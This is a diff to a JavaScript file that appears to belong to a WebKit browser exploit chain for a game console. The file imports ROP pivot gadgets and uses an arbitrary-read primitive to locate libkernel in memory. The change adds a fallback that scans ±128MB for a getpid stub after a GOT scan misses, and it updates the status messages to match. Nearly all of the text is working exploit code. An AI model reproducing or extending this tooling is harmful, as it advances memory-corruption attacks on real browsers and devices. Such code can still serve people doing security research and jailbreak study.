@@ -27,13 +27,13 @@ import {
 } from "./pivot_gadgets.js";
 import {
     resolveLibkernel,
-    scanErrorIatChunk,
+    scanLibkernelChunk,
     isGetpidStub as lkIsGetpidStub,
     verifyManualLibkernel,
 } from "./libkernel_resolve.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250828z";
+const BUILD_ID = "rw-20250829a";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const RESTORE_LOG = params.get("restorelog") === "1";
@@ -334,7 +334,7 @@ function isGetpidStub(v) {
 const MANUAL_TESTS = [
     { id: "elf", group: "base", label: "ELF @ base" },
     { id: "native", group: "base", label: "nativeFn code" },
-    { id: "scan-iat", group: "base", label: "Scan RW GOT" },
+    { id: "scan-iat", group: "base", label: "Scan libkernel" },
     { id: "paste-lk", group: "base", label: "Paste libkernel" },
     { id: "libkernel", group: "base", label: "libkernel" },
     { id: "stub20", group: "base", label: "getpid stub" },
@@ -1677,19 +1677,19 @@ async function runScanIat() {
     }
     if (iatScanState && !iatScanState.done) {
         iatScanState = null;
-        mark("LK-STOP", "IAT scan cancelled");
+        mark("LK-STOP", "libkernel scan cancelled");
         return;
     }
     busy = true;
     setUi();
     iatScanState = null;
-    mark("LK-SCAN", "ELF mapped RW segments only (max 2 reads/slot)");
-    scanState("RW GOT scan…");
+    mark("LK-SCAN", "RW GOT then getpid stub ±128MB (4KB steps)");
+    scanState("libkernel scan…");
     let ticks = 0;
     const maxTicks = 20000;
     try {
         while (ticks++ < maxTicks) {
-            const chunk = scanErrorIatChunk(p, webkitBase, off, iatScanState);
+            const chunk = scanLibkernelChunk(p, webkitBase, off, iatScanState);
             iatScanState = chunk.state;
             if (chunk.phase === "rw-start")
                 mark("LK-RW", "ranges: " + chunk.ranges);
@@ -1701,18 +1701,30 @@ async function runScanIat() {
                     + "…+0x" + chunk.end.toString(16)
                     + " tried=" + chunk.slots);
             else if (chunk.phase === "no-rw")
-                mark("LK-MISS", "no mapped RW ELF segment in cap");
+                mark("LK-MISS", "no mapped RW ELF segment — stub scan next");
+            else if (chunk.phase === "stub-next")
+                mark("LK-STUB", "RW miss"
+                    + (chunk.slots ? " (" + chunk.slots + " slots)" : "")
+                    + " — hunting getpid stub");
+            else if (chunk.phase === "stub-start")
+                mark("LK-STUB", "scan " + chunk.from + "…" + chunk.to);
+            else if (chunk.phase === "stub")
+                scanState("stub @" + chunk.at + " probes=" + chunk.probes);
             if (chunk.done && chunk.lk) {
-                mark("LK-OK", chunk.lk + " IAT +0x" + chunk.iatRva.toString(16)
+                const iat = chunk.iatRva != null
+                    ? " IAT +0x" + chunk.iatRva.toString(16) : "";
+                const extra = chunk.stubAt ? " stub@" + chunk.stubAt : "";
+                mark("LK-OK", chunk.lk + iat + extra
                     + " (" + (chunk.source || "?") + ")");
                 state("libkernel OK", "ok");
                 break;
             }
             if (chunk.done) {
-                mark("LK-MISS", "no libkernel import in RW GOT"
-                    + (chunk.slots ? " (" + chunk.slots + " slots)" : "")
-                    + " — paste base or cal");
-                state("RW GOT miss", "bad");
+                mark("LK-MISS", "RW + stub miss"
+                    + (chunk.slots ? " rw=" + chunk.slots : "")
+                    + (chunk.probes ? " stub=" + chunk.probes : "")
+                    + " — paste base in hex box");
+                state("libkernel miss", "bad");
                 break;
             }
             if ((ticks & 31) === 0)
@@ -1720,12 +1732,12 @@ async function runScanIat() {
             await new Promise(r => setTimeout(r, 0));
         }
         if (ticks >= maxTicks) {
-            mark("LK-FAIL", "IAT scan timeout — reload and retry");
-            state("IAT scan timeout", "bad");
+            mark("LK-FAIL", "libkernel scan timeout — reload and retry");
+            state("libkernel scan timeout", "bad");
         }
     } catch (err) {
         mark("LK-FAIL", err.message || String(err));
-        state("IAT scan error", "bad");
+        state("libkernel scan error", "bad");
     } finally {
         busy = false;
         iatScanState = null;
@@ -1737,20 +1749,22 @@ async function runScanIat() {
 async function ensureLibkernel(p, off, webkitBase) {
     let r = resolveLibkernel(p, webkitBase, off, { log: mark, read8: read8p });
     if (r.ok) return r.lk;
-    mark("NATIVE-STEP", "RW GOT scan…");
+    mark("NATIVE-STEP", "libkernel scan (RW + stub)…");
     let state = null;
     let ticks = 0;
     while (ticks++ < 20000) {
-        const chunk = scanErrorIatChunk(p, webkitBase, off, state);
+        const chunk = scanLibkernelChunk(p, webkitBase, off, state);
         state = chunk.state;
         if (chunk.done && chunk.lk) {
-            mark("LK-OK", chunk.lk + " IAT +0x" + chunk.iatRva.toString(16));
+            const iat = chunk.iatRva != null
+                ? " IAT +0x" + chunk.iatRva.toString(16) : "";
+            mark("LK-OK", chunk.lk + iat + " (" + (chunk.source || "?") + ")");
             return chunk.lk;
         }
         if (chunk.done) break;
         await new Promise(r => setTimeout(r, 0));
     }
-    throw new Error("libkernel unknown — Scan RW GOT or Paste libkernel in hex box");
+    throw new Error("libkernel unknown — Scan libkernel or paste base in hex box");
 }
 
 function stripUiForNative() {
